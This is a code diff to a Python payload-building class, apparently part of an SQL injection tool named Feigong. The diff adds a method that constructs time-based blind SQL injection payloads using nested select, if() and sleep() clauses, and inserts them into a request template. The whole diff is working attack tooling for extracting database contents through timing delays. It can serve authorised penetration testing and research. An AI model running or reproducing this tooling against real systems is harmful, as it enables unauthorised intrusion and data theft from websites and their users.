@@ -9,7 +9,7 @@ __author__ = "LoRexxar"
 
 
 class DealPayload:
-    def __init__(self, sqlirequest, payload, requestformat, filter):
+    def __init__(self, sqlirequest, payload, requestformat, filter, stime):
         """
         payload处理函数初始化，这里将会通过传入的参数，来生成传出的payload
         """
@@ -17,6 +17,7 @@ class DealPayload:
         self.requestformat = requestformat
         self.filter = filter
         self.sqlirequest = sqlirequest
+        self.stime = stime
 
     def construct_request(self, payload):
 
@@ -112,6 +113,55 @@ class DealPayload:
         # 把生成的payload转为小写，并返回
 
         return self.construct_request(self.payload.replace("2333", payload.lower()))
+
+    def construct_time_payload(self, select=None, source=None, conditions=None, limit=0, compare=0):
+
+        # 先拼接payload
+        payload = []
+
+        if select is not None:
+            payload.append('select')
+            payload.append(select)
+
+        if source is not None:
+            payload.append('from')
+            payload.append(source)
+
+        if conditions is not None:
+            payload.append('where')
+            payload.append(conditions)
+
+        payload.append('limit')
+        payload.append(repr(limit) + ',1')
+
+        # 把payload外包裹括号进行比较
+        payload = self.__add_parentheses(" ".join(payload))
+
+        payload = payload.split(" ")
+
+        payload.append(">")
+        payload.append(repr(compare))
+
+        payload = self.__add_parentheses(" ".join(payload))
+
+        # 凭借if语句，构造时间盲注语句
+        payload = "if(" + payload + ",sleep(" + repr(self.stime) + "),0)"
+
+        # 然后再分开继续处理
+        payload = payload.split(" ")
+
+        # 在最前面添加select
+        payload.insert(0, "select")
+        payload = self.__add_parentheses(" ".join(payload))
+
+        # 把生成的payload转为小写，并返回
+        if "Feigong" in self.payload:
+            return self.construct_request(self.payload.replace("Feigong", payload.lower()))
+        elif "2333" in self.payload:
+            return self.construct_request(self.payload.replace("2333", payload.lower()))
+        else:
+            logger.error("self.payload format error...")
+            exit(0)
 
     @staticmethod
     def __add_parentheses(payload):
